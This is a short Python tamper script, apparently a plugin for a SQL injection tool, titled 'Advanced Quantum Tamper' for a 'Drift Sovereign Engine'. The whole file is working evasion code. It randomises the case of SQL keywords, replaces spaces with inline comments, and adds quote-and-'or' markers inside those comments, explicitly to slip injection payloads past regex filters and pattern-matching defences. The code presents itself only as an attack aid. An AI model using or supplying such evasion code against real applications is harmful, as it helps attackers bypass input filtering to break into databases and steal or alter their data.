import random

def random_case(s):
    """
    Probabilistic case-flipping for each character.
    """
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def tamper(payload, **kwargs):
    """
    Advanced Quantum Tamper: Case-randomization + Comment-Injection + Space-Shifting
    Designed for Drift Sovereign Engine v2.1.
    """
    if not payload:
        return payload

    # 1. Randomize case for core SQL keywords to bypass simple regex filters
    keywords = ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE", "LIMIT", "SLEEP", "BENCHMARK", "UPDATE", "INSERT", "DELETE"]
    for kw in keywords:
        payload = payload.replace(kw, random_case(kw))

    # 2. Strategic Space-to-Comment replacement
    payload = payload.replace(" ", "/**/")

    # 3. Logical Entanglement: Injecting logic markers within comments
    # This confuses pattern-matching that looks for raw 'OR' or 'AND'
    payload = payload.replace("/**/", "/*'or'\"*/")

    return payload
